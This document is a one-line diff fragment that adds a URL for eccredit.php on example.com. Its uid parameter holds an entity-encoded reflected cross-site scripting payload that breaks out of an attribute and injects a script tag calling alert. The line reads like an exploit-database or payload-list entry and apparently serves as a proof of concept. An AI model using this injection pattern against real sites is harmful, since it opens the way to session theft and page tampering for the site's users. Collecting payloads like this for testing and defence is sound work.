@@ -1,0 +1,1 @@
+http://www.example.com:80/eccredit.php?action=list&amp;uid=&quot;&gt;&lt;script&gt;alert(/Liscker/);&lt;/script&gt;
